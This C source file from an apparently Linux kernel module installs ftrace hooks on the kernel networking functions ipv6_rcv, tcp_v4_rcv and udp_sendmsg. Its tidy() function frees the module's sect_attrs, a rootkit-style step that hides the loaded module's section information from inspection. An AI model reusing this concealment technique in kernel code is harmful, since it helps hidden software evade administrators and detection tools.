//
// Created by kernel-dbg on 24-2-1.
//
#include <net/sock.h>
#include "tools/tools.h"
#include "api/hook_functions_api.h"
#include "api/ftrace_hook_api.h"
#include "prepare/resolve_function_address.h"
#include "hooks/ipv6_rcv/ipv6_rcv.h"
#include "hooks/tcp_v4_rcv/tcp_v4_rcv.h"
#include "hooks/udp_sendmsg/udp_sendmsg.h"

// 我们添加的 hook 列表, 假设最多10个
struct ftrace_hook hooks[MAXIMUM_SUPPORTED_HOOK_FUNCTIONS];

// 我们当前的 hook 的个数
int number_of_hook = 0;

// 进行hook的安装
int install_hook_functions(void){
    add_ipv6_rcv_to_hook();
    add_tcp_v4_rcv_to_hook();
    add_udp_sendmsg_to_hook();
    fh_install_hooks(hooks, number_of_hook);
    LOG_WITH_PREFIX("already install hooks");
    tidy();
    return 0;
}

/**
 * 进行 hook 的卸载
 */
void uninstall_hook_functions(void) {
    fh_remove_hooks(hooks, number_of_hook);
    LOG_WITH_PREFIX("already uninstall hooks\n");
}

/**
 * 进行清理任务
 */
void tidy(void) {
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
}

/**
 * 进行钩子函数的绑定
 */
void start_install_hooks(void) {
    install_hook_functions();
}

/**
 * 进行钩子函数的解绑
 */
void exit_uninstall_hooks(void) {
    uninstall_hook_functions();
}
